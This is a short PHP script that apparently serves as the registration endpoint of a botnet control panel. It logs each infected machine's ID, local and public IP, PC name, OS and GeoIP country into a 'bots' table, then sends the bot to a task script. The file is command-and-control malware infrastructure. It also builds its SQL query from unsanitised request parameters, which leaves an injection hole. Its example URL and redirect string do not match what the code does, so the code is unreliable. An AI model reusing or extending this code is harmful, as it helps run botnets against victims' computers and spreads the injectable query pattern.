<?php
	//http://localhost:8080/register.php?0=0010B5C4998d&1=0.0.0.0&2=infotest&3=inf&4=wininf&5=info&6=some
	//^^^^^ works
	//?0=0010B5C4998d&1=0.0.0.0&2=infotest&3=inf&4=wininf&5=info&6=some
	if(isset($_GET['uid']) && isset($_GET['lan']) && isset($_GET['nm']) && isset($_GET['os'])){
		
		$uid = $_GET['uid'];
		$lan = $_GET['lan'];
		$name = $_GET['nm'];
		$country = "pt2k.png";
		$os = $_GET['os'];
		
		$wan = $_SERVER['REMOTE_ADDR'];
		
		//$wan = "92.30.15.242";
		//
		// get country based on ip		
		//
		include("geoip/geoip.inc");
		
		$gi = geoip_open("geoip/geo.dat", GEOIP_STANDARD);
		
		$flag = geoip_country_code_by_addr($gi, $wan);
		$country =  geoip_country_name_by_addr($gi, $wan);
		$flag = strtolower($flag);
		
		geoip_close($gi);


		require_once 'config/db.php';
		
		$SQL = "INSERT INTO  `cybortech`.`bots` (`uid` ,`lan` ,`wan` ,`pcname` ,`os` ,`country`, `flag`, `taskn`)VALUES ('$uid', '$lan', '$wan', '$name', '$os', '$country','$flag', '1');";
		$query=mysql_query($SQL);
		if($query) {
			returnheader('/tsk.php?uid=$uid&t=1');
			//echo 'completetestdone';
			}else{
			//data insert gonne wrong
			echo 'register.php_SQL.data-insert-error';
		}
		
		}else{
		//information was not passed correctly
		echo 'register.php_Request.bad-request';
	}
	//echo $uid,$split,;
?>